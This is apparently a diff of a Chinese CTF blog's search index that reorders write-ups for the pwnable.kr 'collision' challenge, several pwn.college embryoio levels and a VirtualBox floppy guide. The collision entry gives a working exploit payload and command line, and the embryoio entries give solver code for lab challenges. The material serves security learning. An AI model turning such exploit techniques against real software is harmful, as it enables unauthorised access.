class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span>(<span class="built_in">strlen</span>(argv[<span class="number">1</span>]) != <span class="number">20</span>)&#123;		<span class="comment">//该外部参数长度必须等于20字节</span></span><br><span class="line">                <span class="built_in">printf</span>(<span class="string">&quot;passcode length should be 20 bytes\n&quot;</span>);</span><br><span class="line">                <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(hashcode == check_password( argv[<span class="number">1</span>] ))&#123;		<span class="comment">//如果外部参数的值等于hashcode则打印flag</span></span><br><span class="line">                system(<span class="string">&quot;/bin/cat flag&quot;</span>);</span><br><span class="line">                <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">                <span class="built_in">printf</span>(<span class="string">&quot;wrong passcode.\n&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
-<p>通过分析上诉代码可以知道我们只要输入5个数字，并控制他们的和等于<code>0x21DD09EC</code>即可。</p>
-<h3 id="利用"><a href="#利用" class="headerlink" title="利用"></a>利用</h3><p>因为<code>0x21DD09EC</code>不能被5整除，所以加一整除后再从某个数据中减一即可。</p>
-<p>所以我们要输入的5个数字的值为：<strong>0x6C5CEC9、0x6C5CEC9、0x6C5CEC9、0x6C5CEC9、0x6C5CEC8</strong></p>
-<p>这里我们需要将16进制数转码为字符，4字节一组，表示一个16进制数，注意是小端序，所以要逆序写：</p>
-<p><strong>\xc9\xce\xc5\x06\xc9\xce\xc5\x06\xc9\xce\xc5\x06\xc9\xce\xc5\x06\xc8\xce\xc5\x06</strong></p>
-<p>最后借助python将这些字符作为参数传进去。</p>
-<h1 id="shell指令"><a href="#shell指令" class="headerlink" title="shell指令"></a>shell指令</h1><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">./col `python -c &#x27;print &quot;\xc9\xce\xc5\x06\xc9\xce\xc5\x06\xc9\xce\xc5\x06\xc9\xce\xc5\x06\xc8\xce\xc5\x06</span><br><span class="line">&quot;&#x27;`</span><br></pre></td></tr></table></figure>
-
-]]></content>
-      <categories>
-        <category>刷题</category>
-        <category>pwnable刷题</category>
-      </categories>
-      <tags>
-        <tag>pwn</tag>
-      </tags>
-  </entry>
-  <entry>
     <title>文件包含入门（web78~web81）</title>
     <url>/2022/07/25/ctfshow_web78~web81/</url>
     <content><![CDATA[<h1 id="ctfshow（web78-web81）-文件包含入门"><a href="#ctfshow（web78-web81）-文件包含入门" class="headerlink" title="ctfshow（web78~web81） 文件包含入门"></a>ctfshow（web78~web81） 文件包含入门</h1><h2 id="前言："><a href="#前言：" class="headerlink" title="前言："></a>前言：</h2><p>​             在这些题中用到了许多php伪协议，这里写两个做题中比较常用的，具体请看博客（<a href="https://blog.csdn.net/qq_53142368/article/details/116594299">(21条消息) PHP伪协议_H0ne的博客-CSDN博客_php伪协议</a>）</p>
@@ -1377,6 +1354,29 @@
       </categories>
       <tags>
         <tag>web</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>collision</title>
+    <url>/2022/07/12/collision(wp)/</url>
+    <content><![CDATA[<h1 id="题目简介"><a href="#题目简介" class="headerlink" title="题目简介"></a>题目简介</h1><p>一个简单的加密函数逆向的题目</p>
+<h1 id="解题流程"><a href="#解题流程" class="headerlink" title="解题流程"></a>解题流程</h1><h2 id="源码分析"><a href="#源码分析" class="headerlink" title="源码分析"></a>源码分析</h2><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="type">unsigned</span> <span class="type">long</span> hashcode = <span class="number">0x21DD09EC</span>;</span><br><span class="line"><span class="type">unsigned</span> <span class="type">long</span> <span class="title function_">check_password</span><span class="params">(<span class="type">const</span> <span class="type">char</span>* p)</span>&#123;</span><br><span class="line">        <span class="type">int</span>* ip = (<span class="type">int</span>*)p;		<span class="comment">//一个int型占4字节，所以类型转换后20字节的字符被分成了5个int型数字</span></span><br><span class="line">        <span class="type">int</span> i;</span><br><span class="line">        <span class="type">int</span> res=<span class="number">0</span>;</span><br><span class="line">        <span class="keyword">for</span>(i=<span class="number">0</span>; i&lt;<span class="number">5</span>; i++)&#123;</span><br><span class="line">                res += ip[i];	<span class="comment">//刚好循环5次，将5个数字累加起来</span></span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> res;		</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">char</span>* argv[])</span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(argc&lt;<span class="number">2</span>)&#123;		<span class="comment">//运行程序时需要传入一个外部参数</span></span><br><span class="line">                <span class="built_in">printf</span>(<span class="string">&quot;usage : %s [passcode]\n&quot;</span>, argv[<span class="number">0</span>]);	</span><br><span class="line">                <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span>(<span class="built_in">strlen</span>(argv[<span class="number">1</span>]) != <span class="number">20</span>)&#123;		<span class="comment">//该外部参数长度必须等于20字节</span></span><br><span class="line">                <span class="built_in">printf</span>(<span class="string">&quot;passcode length should be 20 bytes\n&quot;</span>);</span><br><span class="line">                <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(hashcode == check_password( argv[<span class="number">1</span>] ))&#123;		<span class="comment">//如果外部参数的值等于hashcode则打印flag</span></span><br><span class="line">                system(<span class="string">&quot;/bin/cat flag&quot;</span>);</span><br><span class="line">                <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">                <span class="built_in">printf</span>(<span class="string">&quot;wrong passcode.\n&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>通过分析上诉代码可以知道我们只要输入5个数字，并控制他们的和等于<code>0x21DD09EC</code>即可。</p>
+<h3 id="利用"><a href="#利用" class="headerlink" title="利用"></a>利用</h3><p>因为<code>0x21DD09EC</code>不能被5整除，所以加一整除后再从某个数据中减一即可。</p>
+<p>所以我们要输入的5个数字的值为：<strong>0x6C5CEC9、0x6C5CEC9、0x6C5CEC9、0x6C5CEC9、0x6C5CEC8</strong></p>
+<p>这里我们需要将16进制数转码为字符，4字节一组，表示一个16进制数，注意是小端序，所以要逆序写：</p>
+<p><strong>\xc9\xce\xc5\x06\xc9\xce\xc5\x06\xc9\xce\xc5\x06\xc9\xce\xc5\x06\xc8\xce\xc5\x06</strong></p>
+<p>最后借助python将这些字符作为参数传进去。</p>
+<h1 id="shell指令"><a href="#shell指令" class="headerlink" title="shell指令"></a>shell指令</h1><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">./col `python -c &#x27;print &quot;\xc9\xce\xc5\x06\xc9\xce\xc5\x06\xc9\xce\xc5\x06\xc9\xce\xc5\x06\xc8\xce\xc5\x06</span><br><span class="line">&quot;&#x27;`</span><br></pre></td></tr></table></figure>
+
+]]></content>
+      <categories>
+        <category>刷题</category>
+        <category>pwnable刷题</category>
+      </categories>
+      <tags>
+        <tag>pwn</tag>
       </tags>
   </entry>
   <entry>
@@ -1486,33 +1486,6 @@
       </tags>
   </entry>
   <entry>
-    <title>embryoio level29~level35</title>
-    <url>/2022/06/22/embryoio%20level29~level35/</url>
-    <content><![CDATA[<h1 id="embryoio-level29"><a href="#embryoio-level29" class="headerlink" title="embryoio level29"></a>embryoio level29</h1><h2 id="题目简介"><a href="#题目简介" class="headerlink" title="题目简介"></a>题目简介</h2><p>主要掌握c语言系统调用的使用</p>
-<h2 id="解题流程"><a href="#解题流程" class="headerlink" title="解题流程"></a>解题流程</h2><h3 id="运行程序"><a href="#运行程序" class="headerlink" title="运行程序"></a>运行程序</h3><img src="/2022/06/22/embryoio%20level29~level35/image-20220622191010760.png" class="" title="image-20220622191010760">
-
-<p>上面大致意思就是需要我们在用户目录下写个<code>.c</code>文件，并编译生成一个二进制文件，这个二进制程序里面需要有一个名叫<code>pwncollege</code>的方法，我们需要在父进程运行二进制文件，在子进程里执行题目程序。</p>
-<h3 id="编写c程序"><a href="#编写c程序" class="headerlink" title="编写c程序"></a>编写c程序</h3><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">pwncollege</span><span class="params">(<span class="type">char</span>* argv[],<span class="type">char</span> *env[])</span>&#123;</span><br><span class="line"> execve(<span class="string">&quot;/challenge/embryoio_level29&quot;</span>,argv,env);</span><br><span class="line">    <span class="keyword">return</span> ;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc,<span class="type">char</span>* argv[],<span class="type">char</span>* env[])</span>&#123;</span><br><span class="line">    <span class="type">pid_t</span> fpid;</span><br><span class="line">    fpid=fork();</span><br><span class="line">    <span class="keyword">if</span>(fpid&lt;<span class="number">0</span>)</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;error in fork!\n&quot;</span>);</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span> (fpid==<span class="number">0</span>)&#123;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;我是子进程\n&quot;</span>);</span><br><span class="line">            pwncollege(argv,env);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;我是父进程\n&quot;</span>);</span><br><span class="line">            wait(<span class="literal">NULL</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
-
-<p>以上代码主要实现的是，利用<code>fork()</code>创建一个子进程，用<code>fpid</code>的值来标识程序目前是在执行哪个进程，如果是子进程，则执行<code>execve()</code>系统调用。如果是父进程则等待子进程结束。程序写好后使用以下shell指令编译c文件。</p>
-<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">gcc run.c -o run		#我这里的文件名是“run.c”，“-o”表示自己定义生成的二进制文件文件名，默认是“a.out”。</span><br></pre></td></tr></table></figure>
-
-<p>编译成功后<code>./run</code>运行后即可获得flag。</p>
-<h1 id="embryoio-level30-level35"><a href="#embryoio-level30-level35" class="headerlink" title="embryoio level30~level35"></a>embryoio level30~level35</h1><p>后面的题目解题方法也是和之前的一样，所以还是老样子就放个exp，不讲太多，需要注意的是，每次修改c文件后都要重新编译。</p>
-<h2 id="EXP"><a href="#EXP" class="headerlink" title="EXP"></a>EXP</h2><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">//================level30================</span></span><br><span class="line"><span class="comment">//c程序和level29一样，只不过是运行后还需要输入password（程序会给）</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//================level31================</span></span><br><span class="line"><span class="type">void</span> <span class="title function_">pwncollege</span><span class="params">(<span class="type">char</span>* argv[],<span class="type">char</span> *env[])</span>&#123;</span><br><span class="line">    <span class="type">char</span> *newargv[]=&#123;<span class="string">&quot;embryoio_level31&quot;</span>,<span class="string">&quot;password&quot;</span>,<span class="literal">NULL</span>&#125;; <span class="comment">//这题需要一个外部参数作为密码，其它代码不变，将password替换为程序给出的密码</span></span><br><span class="line">    execve(<span class="string">&quot;/challenge/embryoio_level31&quot;</span>,newargv,env);</span><br><span class="line">    <span class="keyword">return</span> ;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//================level32================</span></span><br><span class="line"><span class="type">void</span> <span class="title function_">pwncollege</span><span class="params">(<span class="type">char</span>* argv[],<span class="type">char</span> *env[])</span>&#123;</span><br><span class="line">    <span class="type">char</span> *newenv[] = &#123;<span class="string">&quot;environment=value&quot;</span>,<span class="literal">NULL</span>&#125;;	<span class="comment">//这题和上一题差不多，替换为对应的环境变量即可</span></span><br><span class="line">    execve(<span class="string">&quot;/challenge/embryoio_level32&quot;</span>,argv,newenv); </span><br><span class="line">    <span class="keyword">return</span> ;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//================level33================</span></span><br><span class="line"><span class="comment">//c程序和level29一样，只不过是需要在执行的时候有个重定向操作</span></span><br><span class="line"><span class="comment">//使用“./run &lt; /tmp/filename”执行（filename替换为程序给出的文件名），会给出需要的密码提示，将密码写进去再次运行则可以拿到flag</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//================level34================</span></span><br><span class="line"><span class="comment">//具体操作和上一题差不多</span></span><br><span class="line"><span class="comment">//使用“./run &gt; /tmp/filename”执行，flag就被输出到目标文件下，cat以下即可获得flag。</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//================level35================</span></span><br><span class="line"><span class="type">void</span> <span class="title function_">pwncollege</span><span class="params">(<span class="type">char</span>* argv[],<span class="type">char</span> *env[])</span>&#123;</span><br><span class="line">    <span class="type">char</span> *newenv[] = &#123;<span class="literal">NULL</span>&#125;;		<span class="comment">//这题需要一个空环境变量，那么就将newenv设为NULL即可，其它代码保持不变，运行即可获得flag。</span></span><br><span class="line">    execve(<span class="string">&quot;/challenge/embryoio_level35&quot;</span>,argv,newenv);</span><br><span class="line">    <span class="keyword">return</span> ;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
-
-
-
-]]></content>
-      <categories>
-        <category>刷题</category>
-        <category>pwncollege刷题</category>
-      </categories>
-      <tags>
-        <tag>pwn</tag>
-      </tags>
-  </entry>
-  <entry>
     <title>embryoio level36~level59</title>
     <url>/2022/07/12/embryoio%20level36~level59/</url>
     <content><![CDATA[<h1 id="embryoio-level36-level47"><a href="#embryoio-level36-level47" class="headerlink" title="embryoio level36~level47"></a>embryoio level36~level47</h1><h2 id="题目简介"><a href="#题目简介" class="headerlink" title="题目简介"></a>题目简介</h2><p>Linux终端和shell脚本的管道符使用</p>
@@ -1531,6 +1504,33 @@
 
 <p>编写python脚本运行后又出现需要管道接收输出的提示。</p>
 <h3 id="python脚本"><a href="#python脚本" class="headerlink" title="python脚本"></a>python脚本</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#===============================level48===============================</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">io1 = subprocess.Popen(<span class="string">&#x27;/challenge/embryoio_level48&#x27;</span>, stdout=PIPE)</span><br><span class="line">io2 = subprocess.Popen(<span class="string">&#x27;cat&#x27;</span>, stdin=io1.stdout, stdout=PIPE)</span><br><span class="line">output = io2.communicate()[<span class="number">0</span>]</span><br><span class="line"><span class="built_in">print</span>(output)</span><br><span class="line"></span><br><span class="line"><span class="comment">#===============================level49===============================</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">io1 = subprocess.Popen(<span class="string">&quot;/challenge/embryoio_level49&quot;</span>, stdout=PIPE)</span><br><span class="line">io2 = subprocess.Popen([<span class="string">&#x27;grep&#x27;</span>, <span class="string">&#x27;pwn&#x27;</span>], stdin=io1.stdout, stdout=PIPE)</span><br><span class="line">output = io2.communicate()[<span class="number">0</span>]</span><br><span class="line"><span class="built_in">print</span>(output)</span><br><span class="line"></span><br><span class="line"><span class="comment">#===============================level50===============================</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">io1 = subprocess.Popen(<span class="string">&quot;/challenge/embryoio_level50&quot;</span>, stdout=PIPE)</span><br><span class="line">io2 = subprocess.Popen([<span class="string">&#x27;sed&#x27;</span>, <span class="string">&#x27;1d&#x27;</span>], stdin=io1.stdout, stdout=PIPE)</span><br><span class="line">output = io2.communicate()[<span class="number">0</span>]</span><br><span class="line"><span class="built_in">print</span>(output)</span><br><span class="line"></span><br><span class="line"><span class="comment">#===============================level51===============================</span></span><br><span class="line"><span class="comment">#将逆序的flag复制到文本里，再rev输出</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">io1 = subprocess.Popen(<span class="string">&quot;/challenge/embryoio_level51&quot;</span>, stdout=PIPE)</span><br><span class="line">io2 = subprocess.Popen(<span class="string">&#x27;rev&#x27;</span>, stdin=io1.stdout, stdout=PIPE)</span><br><span class="line">output = io2.communicate()[<span class="number">0</span>]</span><br><span class="line"><span class="built_in">print</span>(output)</span><br><span class="line"></span><br><span class="line"><span class="comment">#===============================level52===============================</span></span><br><span class="line"><span class="comment">#运行后输入密码获得flag</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">io1 = subprocess.Popen(<span class="string">&#x27;cat&#x27;</span>, stdout=PIPE)</span><br><span class="line">io2 = subprocess.Popen(<span class="string">&quot;/challenge/embryoio_level52&quot;</span>, stdin=io1.stdout)</span><br><span class="line">output = io1.communicate()[<span class="number">0</span>]</span><br><span class="line"><span class="built_in">print</span>(output)</span><br><span class="line"></span><br><span class="line"><span class="comment">#===============================level53===============================</span></span><br><span class="line"><span class="comment">#运行后逆序输入密码获得flag</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">io1 = subprocess.Popen(<span class="string">&#x27;rev&#x27;</span>, stdout=PIPE)</span><br><span class="line">io2 = subprocess.Popen(<span class="string">&quot;/challenge/embryoio_level53&quot;</span>, stdin=io1.stdout)</span><br><span class="line">output = io1.communicate()[<span class="number">0</span>]</span><br><span class="line"><span class="built_in">print</span>(output)</span><br><span class="line"></span><br><span class="line"><span class="comment">#===============================level54~level59===============================</span></span><br><span class="line"><span class="comment">#又是一遍“十万年轮回”，题目和上诉题目差不多，题解参考上诉脚本。</span></span><br></pre></td></tr></table></figure>
+
+]]></content>
+      <categories>
+        <category>刷题</category>
+        <category>pwncollege刷题</category>
+      </categories>
+      <tags>
+        <tag>pwn</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>embryoio level29~level35</title>
+    <url>/2022/06/22/embryoio%20level29~level35/</url>
+    <content><![CDATA[<h1 id="embryoio-level29"><a href="#embryoio-level29" class="headerlink" title="embryoio level29"></a>embryoio level29</h1><h2 id="题目简介"><a href="#题目简介" class="headerlink" title="题目简介"></a>题目简介</h2><p>主要掌握c语言系统调用的使用</p>
+<h2 id="解题流程"><a href="#解题流程" class="headerlink" title="解题流程"></a>解题流程</h2><h3 id="运行程序"><a href="#运行程序" class="headerlink" title="运行程序"></a>运行程序</h3><img src="/2022/06/22/embryoio%20level29~level35/image-20220622191010760.png" class="" title="image-20220622191010760">
+
+<p>上面大致意思就是需要我们在用户目录下写个<code>.c</code>文件，并编译生成一个二进制文件，这个二进制程序里面需要有一个名叫<code>pwncollege</code>的方法，我们需要在父进程运行二进制文件，在子进程里执行题目程序。</p>
+<h3 id="编写c程序"><a href="#编写c程序" class="headerlink" title="编写c程序"></a>编写c程序</h3><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">pwncollege</span><span class="params">(<span class="type">char</span>* argv[],<span class="type">char</span> *env[])</span>&#123;</span><br><span class="line"> execve(<span class="string">&quot;/challenge/embryoio_level29&quot;</span>,argv,env);</span><br><span class="line">    <span class="keyword">return</span> ;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc,<span class="type">char</span>* argv[],<span class="type">char</span>* env[])</span>&#123;</span><br><span class="line">    <span class="type">pid_t</span> fpid;</span><br><span class="line">    fpid=fork();</span><br><span class="line">    <span class="keyword">if</span>(fpid&lt;<span class="number">0</span>)</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;error in fork!\n&quot;</span>);</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span> (fpid==<span class="number">0</span>)&#123;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;我是子进程\n&quot;</span>);</span><br><span class="line">            pwncollege(argv,env);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;我是父进程\n&quot;</span>);</span><br><span class="line">            wait(<span class="literal">NULL</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>以上代码主要实现的是，利用<code>fork()</code>创建一个子进程，用<code>fpid</code>的值来标识程序目前是在执行哪个进程，如果是子进程，则执行<code>execve()</code>系统调用。如果是父进程则等待子进程结束。程序写好后使用以下shell指令编译c文件。</p>
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">gcc run.c -o run		#我这里的文件名是“run.c”，“-o”表示自己定义生成的二进制文件文件名，默认是“a.out”。</span><br></pre></td></tr></table></figure>
+
+<p>编译成功后<code>./run</code>运行后即可获得flag。</p>
+<h1 id="embryoio-level30-level35"><a href="#embryoio-level30-level35" class="headerlink" title="embryoio level30~level35"></a>embryoio level30~level35</h1><p>后面的题目解题方法也是和之前的一样，所以还是老样子就放个exp，不讲太多，需要注意的是，每次修改c文件后都要重新编译。</p>
+<h2 id="EXP"><a href="#EXP" class="headerlink" title="EXP"></a>EXP</h2><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">//================level30================</span></span><br><span class="line"><span class="comment">//c程序和level29一样，只不过是运行后还需要输入password（程序会给）</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//================level31================</span></span><br><span class="line"><span class="type">void</span> <span class="title function_">pwncollege</span><span class="params">(<span class="type">char</span>* argv[],<span class="type">char</span> *env[])</span>&#123;</span><br><span class="line">    <span class="type">char</span> *newargv[]=&#123;<span class="string">&quot;embryoio_level31&quot;</span>,<span class="string">&quot;password&quot;</span>,<span class="literal">NULL</span>&#125;; <span class="comment">//这题需要一个外部参数作为密码，其它代码不变，将password替换为程序给出的密码</span></span><br><span class="line">    execve(<span class="string">&quot;/challenge/embryoio_level31&quot;</span>,newargv,env);</span><br><span class="line">    <span class="keyword">return</span> ;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//================level32================</span></span><br><span class="line"><span class="type">void</span> <span class="title function_">pwncollege</span><span class="params">(<span class="type">char</span>* argv[],<span class="type">char</span> *env[])</span>&#123;</span><br><span class="line">    <span class="type">char</span> *newenv[] = &#123;<span class="string">&quot;environment=value&quot;</span>,<span class="literal">NULL</span>&#125;;	<span class="comment">//这题和上一题差不多，替换为对应的环境变量即可</span></span><br><span class="line">    execve(<span class="string">&quot;/challenge/embryoio_level32&quot;</span>,argv,newenv); </span><br><span class="line">    <span class="keyword">return</span> ;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//================level33================</span></span><br><span class="line"><span class="comment">//c程序和level29一样，只不过是需要在执行的时候有个重定向操作</span></span><br><span class="line"><span class="comment">//使用“./run &lt; /tmp/filename”执行（filename替换为程序给出的文件名），会给出需要的密码提示，将密码写进去再次运行则可以拿到flag</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//================level34================</span></span><br><span class="line"><span class="comment">//具体操作和上一题差不多</span></span><br><span class="line"><span class="comment">//使用“./run &gt; /tmp/filename”执行，flag就被输出到目标文件下，cat以下即可获得flag。</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//================level35================</span></span><br><span class="line"><span class="type">void</span> <span class="title function_">pwncollege</span><span class="params">(<span class="type">char</span>* argv[],<span class="type">char</span> *env[])</span>&#123;</span><br><span class="line">    <span class="type">char</span> *newenv[] = &#123;<span class="literal">NULL</span>&#125;;		<span class="comment">//这题需要一个空环境变量，那么就将newenv设为NULL即可，其它代码保持不变，运行即可获得flag。</span></span><br><span class="line">    execve(<span class="string">&quot;/challenge/embryoio_level35&quot;</span>,argv,newenv);</span><br><span class="line">    <span class="keyword">return</span> ;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+
 
 ]]></content>
       <categories>
@@ -1563,6 +1563,22 @@
 <h2 id="解题流程"><a href="#解题流程" class="headerlink" title="解题流程"></a>解题流程</h2><h3 id="运行程序"><a href="#运行程序" class="headerlink" title="运行程序"></a>运行程序</h3><p><img src="/2022/06/08/embryoio-level2/level2-1.png" alt="屏幕截图 2022-06-07 120319"></p>
 <p>可以看到程序让我们输入一个简单的密码，我们先随便输入个数据，然后看到程序说我们的密码是错的，正确的密码就在括号里。所以我们再次运行程序，输入正确的密码，就得到了flag，具体操作如下图所示。</p>
 <p><img src="/2022/06/08/embryoio-level2/level2-2.png" alt="屏幕截图 2022-06-07 121423"></p>
+]]></content>
+      <categories>
+        <category>刷题</category>
+        <category>pwncollege刷题</category>
+      </categories>
+      <tags>
+        <tag>pwn</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>embryoio level3</title>
+    <url>/2022/06/08/embryoio-level3/</url>
+    <content><![CDATA[<h2 id="题目简介"><a href="#题目简介" class="headerlink" title="题目简介"></a>题目简介</h2><p>会用基本的Linux指令</p>
+<h2 id="解题流程"><a href="#解题流程" class="headerlink" title="解题流程"></a>解题流程</h2><h3 id="运行程序"><a href="#运行程序" class="headerlink" title="运行程序"></a>运行程序</h3><p><img src="/2022/06/08/embryoio-level3/level3-1.png" alt="屏幕截图 2022-06-07 122020"></p>
+<p>还是老样子，上来先运行题目程序，根据输出语句，大概可以知道这个程序需要一个外部输入参数，而且第一个外部输入参数的值也告诉了我们，所以我们在执行程序运行的时候，从外部传一个正确的值进去，就可以拿到flag了，具体操作如下图所示。</p>
+<p><img src="/2022/06/08/embryoio-level3/level3-2.png" alt="屏幕截图 2022-06-07 123654"></p>
 ]]></content>
       <categories>
         <category>刷题</category>
@@ -1620,22 +1636,6 @@
 
 
 
-]]></content>
-      <categories>
-        <category>刷题</category>
-        <category>pwncollege刷题</category>
-      </categories>
-      <tags>
-        <tag>pwn</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>embryoio level3</title>
-    <url>/2022/06/08/embryoio-level3/</url>
-    <content><![CDATA[<h2 id="题目简介"><a href="#题目简介" class="headerlink" title="题目简介"></a>题目简介</h2><p>会用基本的Linux指令</p>
-<h2 id="解题流程"><a href="#解题流程" class="headerlink" title="解题流程"></a>解题流程</h2><h3 id="运行程序"><a href="#运行程序" class="headerlink" title="运行程序"></a>运行程序</h3><p><img src="/2022/06/08/embryoio-level3/level3-1.png" alt="屏幕截图 2022-06-07 122020"></p>
-<p>还是老样子，上来先运行题目程序，根据输出语句，大概可以知道这个程序需要一个外部输入参数，而且第一个外部输入参数的值也告诉了我们，所以我们在执行程序运行的时候，从外部传一个正确的值进去，就可以拿到flag了，具体操作如下图所示。</p>
-<p><img src="/2022/06/08/embryoio-level3/level3-2.png" alt="屏幕截图 2022-06-07 123654"></p>
 ]]></content>
       <categories>
         <category>刷题</category>
@@ -1974,54 +1974,6 @@
       </tags>
   </entry>
   <entry>
-    <title>关于Oracle VM VirtualBox如何使用软驱的问题</title>
-    <url>/2022/06/19/%E5%85%B3%E4%BA%8EOracle%20VM%20VirtualBox%E5%A6%82%E4%BD%95%E4%BD%BF%E7%94%A8%E8%BD%AF%E9%A9%B1%E7%9A%84%E9%97%AE%E9%A2%98/</url>
-    <content><![CDATA[<p>近期做到了一道题目，里面需要用到在虚拟机上挂载软盘的知识，查阅了一些资料，在这里进行一个总结。</p>
-<p>首先打开虚拟机，选择新建</p>
-<img src="/2022/06/19/%E5%85%B3%E4%BA%8EOracle%20VM%20VirtualBox%E5%A6%82%E4%BD%95%E4%BD%BF%E7%94%A8%E8%BD%AF%E9%A9%B1%E7%9A%84%E9%97%AE%E9%A2%98/wps7.jpg" class="" title="img"> 
-
-<p>在这里经过一些尝试，发现必须指定好系统的类型和版本，点击下一步，内存大小自定义，再下一步</p>
-<img src="/2022/06/19/%E5%85%B3%E4%BA%8EOracle%20VM%20VirtualBox%E5%A6%82%E4%BD%95%E4%BD%BF%E7%94%A8%E8%BD%AF%E9%A9%B1%E7%9A%84%E9%97%AE%E9%A2%98/wps8.jpg" class="" title="img"> 
-
-<p>在这里需要创建虚拟硬盘，下一步</p>
-<img src="/2022/06/19/%E5%85%B3%E4%BA%8EOracle%20VM%20VirtualBox%E5%A6%82%E4%BD%95%E4%BD%BF%E7%94%A8%E8%BD%AF%E9%A9%B1%E7%9A%84%E9%97%AE%E9%A2%98/wps9.jpg" class="" title="img"> 
-
-<p>直接下一步</p>
-<img src="/2022/06/19/%E5%85%B3%E4%BA%8EOracle%20VM%20VirtualBox%E5%A6%82%E4%BD%95%E4%BD%BF%E7%94%A8%E8%BD%AF%E9%A9%B1%E7%9A%84%E9%97%AE%E9%A2%98/wps10.jpg" class="" title="img"> 
-
-<p>给固定大小就行，下一步的文件位置和大小自定义，这样就创建好了</p>
